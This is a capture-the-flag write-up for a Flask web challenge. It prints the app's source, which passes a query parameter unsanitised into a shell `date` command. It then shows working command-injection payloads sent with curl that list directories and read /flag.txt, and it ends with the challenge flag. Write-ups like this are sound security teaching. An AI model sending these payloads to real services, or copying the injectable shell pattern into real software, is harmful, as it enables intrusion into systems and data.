---
layout: writeup
title: Induction Therapy
tags: WebX
---

## Description

The citizens of Freedonia are preparing for an upcoming national vote - but before they can make their voices heard, they’ll need to get informed. This challenge drops participants into a voter education web portal where all candidates, policies, and debates are presented for review. Only time will tell who'll you vote for soon...

<!--more-->

http://redac.ted:9001/

We were also then given the source code

## Solution

Here is the app.py for this challenge:

```python
from flask import Flask, request, render_template  # update import
import subprocess

app = Flask(__name__)

# Gotta serve something to the public, right?
@app.route("/")
def index():
    return render_template("index.html")

@app.route('/candidates')
def candidates():
    return render_template('candidates.html')

@app.route('/policies')
def policies():
    return render_template('policies.html')

@app.route('/debate')
def debate():
    return render_template('debate.html')

@app.route("/pretty")
def pretty():
    fmt = request.args.get("format", "")
    try:
        result = subprocess.check_output(f"date +'{fmt}'", shell=True, stderr=subprocess.STDOUT, timeout=2)
        return f"{result.decode()}"
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}", 400
    except Exception as e:
        return f"{str(e)}", 500

@app.route("/subscribe", methods=["POST"])
def subscribe():
    email = request.form.get("email", "")
    print(f"Received subscription request from: {email}")
    return "Subscribed", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9001)
```

A promosing line in here is:

```python
# ...
@app.route("/pretty")
def pretty():
	fmt = request.args.get("format", "")
	try:
		result = subprocess.check_output(f"date +'{fmt}'", shell=True, stderr=subprocess.STDOUT, timeout=2)
# ...
```

For those who don't know, `subprocess` is used to execute code in the shell, and they use no sanitisation when getting client input and using it in a code execution. So we can put any code in a query at `/pretty` and therefore execute any code we want as long as the command takes less then 2 seconds to execute. Lets test this.

```bash
$ curl "http://re.da.ct.ed:9001/pretty?format=';ls;:'"

"<sfi000024v576754>
"<sfi000025v576754>
"<sfi000032v294427>
"<sfi000033v294427>
app.py
templates
```

Let's break down that payload: `';ls;:'` This creates the full command `date + '';ls;:''`

The first first apostrophe is used to escape the already existanct apostropher, the semi colon is used to exeucte another command, and then to escape the last apostrophe gained from the `'{fmt}'`

The colon is used becuase `:''` does nothing, and as such removes the error message having a `''` would cause. So by just putting out command in between `';` and `;:'` we can execute whatever command we want.

Time to find the flag

```bash
$ curl "http://re.da.ct.ed:9001/pretty?format=';ls%20/;:'"

app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

And there is the flag in the filesystem root directory `/` time to cat it

```bash
$ curl "http://re.da.ct.ed:9001/pretty?format=';cat%20/flag.txt;:'"

secedu{th3re_is_4lways_a_t1me_&_plac3_to_bre4k_0u7}
```

Finally we have the flag: `secedu{th3re_is_4lways_a_t1me_&_plac3_to_bre4k_0u7}`
